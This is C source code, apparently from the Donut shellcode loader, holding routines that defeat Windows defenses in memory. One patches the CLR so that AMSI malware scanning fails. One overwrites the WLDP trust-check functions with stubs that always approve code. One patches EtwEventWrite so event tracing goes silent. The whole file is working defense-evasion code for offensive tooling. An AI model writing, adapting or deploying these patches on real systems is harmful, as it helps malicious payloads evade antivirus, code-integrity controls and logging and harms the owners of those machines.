#include "bypass.h"


#if defined(BYPASS_AMSI_A)

BOOL IsReadablePage(DWORD protect)
{
    if (protect & PAGE_GUARD)
        return FALSE;

    if (protect & PAGE_NOACCESS)
        return FALSE;

    DWORD baseProtect = protect & 0xff;

    switch (baseProtect)
    {
    case PAGE_READONLY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
    case PAGE_EXECUTE_READ:
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
        return TRUE;

    default:
        return FALSE;
    }
}

static BYTE* FindBytes(BYTE* start, SIZE_T size, const char* pattern)
{
    SIZE_T pattern_size;
    SIZE_T offset;
    SIZE_T i;

    if (start == NULL || size == 0 || pattern == NULL || pattern[0] == '\0')
        return NULL;

    pattern_size = 0;
    while (pattern[pattern_size] != '\0')
        pattern_size++;

    if (pattern_size > size)
        return NULL;

    for (offset = 0; offset <= size - pattern_size; offset++)
    {
        i = 0;

        while (i < pattern_size &&
               start[offset + i] == (BYTE)pattern[i])
        {
            i++;
        }

        if (i == pattern_size)
            return start + offset;
    }

    return NULL;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) 
{
    LPVOID clr;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    BYTE* moduleStart;
    SIZE_T moduleSize;
    BYTE* moduleEnd;
    BYTE* current;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* regionBase;
    BYTE* regionEnd;
    BYTE* scanStart;
    SIZE_T scanSize;
    BYTE* found = NULL;
    DWORD op, t;

    
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) 
      return FALSE;
    
    DPRINT("GetModuleHandleA %p", clr);

    dos = (PIMAGE_DOS_HEADER)clr;  
    nt = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  

    moduleStart = (BYTE*)clr;
    moduleSize = nt->OptionalHeader.SizeOfImage;
    moduleEnd = moduleStart + moduleSize;
    current = moduleStart;

    while (current < moduleEnd)
    {
        if (!inst->api.VirtualQuery((LPVOID)current, &mbi, sizeof(mbi)))
            break;

        regionBase = (BYTE*)mbi.BaseAddress;
        regionEnd  = regionBase + mbi.RegionSize;

        if (regionEnd > moduleEnd)
            regionEnd = moduleEnd;

        scanStart = current;

        if (scanStart < regionBase)
            scanStart = regionBase;

        if (
            mbi.State == MEM_COMMIT &&
            IsReadablePage(mbi.Protect) &&
            scanStart < regionEnd
        )
        {
            scanSize = regionEnd - scanStart;

            found = FindBytes(scanStart, scanSize, inst->amsiScanBuf);

            DPRINT("FindBytes %p", found);

            if (found)
                break;
        }

        current = regionEnd;
    }

    if (found)
    {
      if (!inst->api.VirtualProtect(found, 4, PAGE_EXECUTE_READWRITE, &op)) 
        return FALSE;
      Memcpy(found, inst->amsiScanBuf+1, 4);
      inst->api.VirtualProtect(found, 4, op, &t);
      return TRUE;
    }

  return FALSE;
}

#elif defined(BYPASS_AMSI_B)

BOOL DisableAMSI(PDONUT_INSTANCE inst) 
{    
  return FALSE;
}

#endif

#if defined(BYPASS_WLDP_A)

BOOL DisableWLDP(PDONUT_INSTANCE inst) 
{
    return TRUE;
}

#elif defined(BYPASS_WLDP_B)

// fake function that always returns S_OK and isApproved = TRUE
HRESULT WINAPI WldpIsClassInApprovedListStub(
    REFCLSID               classID,
    PWLDP_HOST_INFORMATION hostInformation,
    PBOOL                  isApproved,
    DWORD                  optionalFlags)
{
    *isApproved = TRUE;
    return S_OK;
}

// make sure prototype and code are different from other subroutines
// to avoid removal by MSVC
int WldpIsClassInApprovedListStubEnd(int a, int b) {
  return a - b;
}

// fake function that always returns S_OK
HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
  return a / b;
}

BOOL DisableWLDP(PDONUT_INSTANCE inst) 
{
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // try load wldp. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    wldp = xGetLibAddress(inst, inst->wldp);
    if(wldp == NULL) return TRUE;
    
    // resolve address of WldpQueryDynamicCodeTrust
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
      
    DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    // resolve address of WldpIsClassInApprovedList
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
          (ULONG_PTR)WldpIsClassInApprovedListStub;
    
    DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}
#endif

#if defined(BYPASS_ETW_A)

BOOL DisableETW(PDONUT_INSTANCE inst) 
{
    HMODULE ntdll;
    DWORD   len, op, t;
    LPVOID  pEventWrite ;

    ntdll = xGetLibAddress(inst, inst->ntdll);
    pEventWrite  = xGetProcAddress(inst, ntdll, inst->etwEventWrite, 0);
    if (pEventWrite  == NULL) 
      return FALSE;

#ifdef _WIN64

    if (!inst->api.VirtualProtect(pEventWrite, 4, PAGE_EXECUTE_READWRITE, &op)) 
      return FALSE;
    Memcpy(pEventWrite, inst->etwRet64, 4);
    inst->api.VirtualProtect(pEventWrite, 4, op, &t);

#else

    if (!inst->api.VirtualProtect(pEventWrite, 5, PAGE_EXECUTE_READWRITE, &op)) 
      return FALSE;
    Memcpy(pEventWrite, inst->etwRet32, 5);
    inst->api.VirtualProtect(pEventWrite, 5, op, &t);

#endif

    return TRUE;
}

#elif defined(BYPASS_ETW_B)

BOOL DisableETW(PDONUT_INSTANCE inst) 
{
    return TRUE;
}

#endif